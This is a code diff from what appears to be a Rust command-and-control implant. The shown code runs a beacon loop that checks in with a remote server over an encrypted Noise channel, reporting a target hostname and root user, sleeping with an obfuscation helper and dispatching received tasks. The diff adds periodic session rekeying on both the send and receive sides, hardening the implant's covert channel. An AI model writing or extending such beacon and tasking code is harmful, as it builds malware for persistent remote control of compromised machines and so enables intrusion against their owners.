@@ -255,13 +255,29 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
     let _ = transport.request(&buf[..len]); 
 
     let mut session = noise.into_transport_mode().unwrap();
+    let mut packet_count: u64 = 0;
+    let mut last_rekey = 0; // Simplified time proxy
 
     loop {
+        // Check if rekey is needed (1M packets or time proxy)
+        // For MVP, we rekey every 100 check-ins or 1M packets
+        if packet_count >= 1_000_000 || last_rekey >= 100 {
+            let rekey_frame = WraithFrame::new(packet::FRAME_TYPE_REKEY, Vec::new());
+            let rb = rekey_frame.serialize();
+            let len = session.write_message(&rb, &mut buf).unwrap();
+            let _ = transport.request(&buf[..len]);
+            
+            session.rekey_outgoing();
+            packet_count = 0;
+            last_rekey = 0;
+        }
+
         let beacon_json = r#"{"id": "spectre", "hostname": "target", "username": "root"}"#;
         let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
         let frame_bytes = frame.serialize();
 
         let len = session.write_message(&frame_bytes, &mut buf).unwrap();
+        packet_count += 1;
 
         if let Ok(resp) = transport.request(&buf[..len]) {
             let mut pt = [0u8; 8192];
@@ -271,6 +287,7 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
             }
         }
 
+        last_rekey += 1;
         crate::utils::obfuscation::sleep(config.sleep_interval);
     }
 }
@@ -304,6 +321,14 @@ fn hex_decode(s: &str) -> Vec<u8> {
 }
 
 fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &mut HttpTransport) {
+    // Check for Rekey Frame first (outer wrap)
+    if let Some(frame) = WraithFrame::deserialize(data) {
+        if frame.frame_type == packet::FRAME_TYPE_REKEY {
+            session.rekey_incoming();
+            return;
+        }
+    }
+
     let clean_data = if let Some(idx) = data.iter().position(|&x| x == 0) {
         &data[..idx]
     } else {
